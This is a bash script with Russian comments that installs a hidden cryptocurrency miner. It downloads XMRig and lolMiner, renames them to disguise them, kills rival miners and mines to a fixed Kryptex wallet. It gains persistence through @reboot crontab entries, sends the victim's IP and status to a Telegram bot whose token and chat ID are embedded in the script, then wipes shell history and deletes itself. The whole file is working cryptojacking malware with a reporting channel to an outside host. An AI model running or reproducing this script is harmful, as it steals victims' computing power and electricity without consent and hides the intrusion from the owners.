#!/bin/bash

FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# [ ПУЛЫ ]
POOL_CPU_1="xmr.kryptex.network:7029"
POOL_CPU_2="xmr-eu.kryptex.network:7029"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

# [ ДИРЕКТОРИЯ ]
# Всегда используем домашнюю папку или tmp, чтобы не было проблем с правами
BASE_DIR="$HOME/.connfy-core"
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit

# Имена файлов
BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ----------------------------------------------------
# [ ФАЗА 1: ID И ЗАЧИСТКА ]
# ----------------------------------------------------

get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    if [ -z "$safe_ip" ]; then safe_ip="111111"; fi
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)

# Убиваем старое дерьмо
pkill -9 -f "xmrig" >/dev/null 2>&1
pkill -9 -f "lolminer" >/dev/null 2>&1
pkill -9 -f "$BIN_CPU" >/dev/null 2>&1
pkill -9 -f "$BIN_GPU" >/dev/null 2>&1

# ----------------------------------------------------
# [ ФАЗА 2: ЗАГРУЗКА ВСЕГО (БЕЗ ПРОВЕРОК) ]
# ----------------------------------------------------
echo "[+] Force downloading modules..."

# --- CPU ---
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
    tar -xf cpu.tar.gz
    FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
    if [ -n "$FOUND_CPU" ]; then
        mv "$FOUND_CPU" "./$BIN_CPU"
        chmod +x "./$BIN_CPU"
    fi
    rm -rf cpu.tar.gz xmrig*
fi

# Конфиг CPU
cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# --- GPU (КАЧАЕМ ВСЕГДА) ---
# Никаких if lspci. Просто качаем.
if [ ! -f "$BIN_GPU" ]; then
    curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER" || wget -qO gpu.tar.gz "$URL_LOLMINER"
    tar -xf gpu.tar.gz
    FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
    if [ -n "$FOUND_GPU" ]; then
        mv "$FOUND_GPU" "./$BIN_GPU"
        chmod +x "./$BIN_GPU"
    fi
    rm -rf gpu.tar.gz 1.98a
fi

# ----------------------------------------------------
# [ ФАЗА 3: ЗАПУСК (FORCE LAUNCH) ]
# ----------------------------------------------------

# Создаем скрипт запуска CPU
echo "#!/bin/bash" > run_cpu.sh
echo "cd $BASE_DIR" >> run_cpu.sh
echo "exec ./$BIN_CPU --config=config.json" >> run_cpu.sh
chmod +x run_cpu.sh

# Создаем скрипт запуска GPU (ETC + KASPA DUAL или просто ETC)
# Для 3080 Ti лучше всего ETC (Etchash) на Kryptex.
echo "#!/bin/bash" > run_gpu.sh
echo "cd $BASE_DIR" >> run_gpu.sh
# Важно: --nocolor чтобы логи не забивались escape-символами
echo "exec ./$BIN_GPU --algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor --watchdog exit" >> run_gpu.sh
chmod +x run_gpu.sh

echo "[+] Igniting engines..."

# ЗАПУСКАЕМ CPU
nohup ./run_cpu.sh >/dev/null 2>&1 &
PID_CPU=$!
echo "[+] CPU started (PID: $PID_CPU)"

# ЗАПУСКАЕМ GPU (ПОХУЙ ЕСТЬ ОНА ИЛИ НЕТ)
if [ -f "./$BIN_GPU" ]; then
    nohup ./run_gpu.sh >/dev/null 2>&1 &
    PID_GPU=$!
    echo "[+] GPU launched blindly (PID: $PID_GPU)"
else
    echo "[-] GPU binary download failed, skipping."
fi

# ----------------------------------------------------
# [ ФАЗА 4: ПЕРСИСТЕНТНОСТЬ (ЕСЛИ МОЖЕМ) ]
# ----------------------------------------------------

# Проверяем, есть ли crontab ВООБЩЕ. Если нет - пропускаем, чтобы не было ошибки.
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null; echo "@reboot $BASE_DIR/run_cpu.sh") | crontab -
    (crontab -l 2>/dev/null; echo "@reboot $BASE_DIR/run_gpu.sh") | crontab -
    PERSIST="Crontab Installed"
else
    PERSIST="No Cron (Runtime Only)"
fi

# ----------------------------------------------------
# [ ОТЧЕТ ]
# ----------------------------------------------------

MSG="🚀 <b>GOD MODE: BLIND FIRE</b> %0A🆔 <b>ID:</b> $WORKER%0A🔧 <b>Persist:</b> $PERSIST%0A⚔️ <b>Status:</b> CPU & GPU Launched"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1

# Чистим за собой
history -c
rm -f "$0"
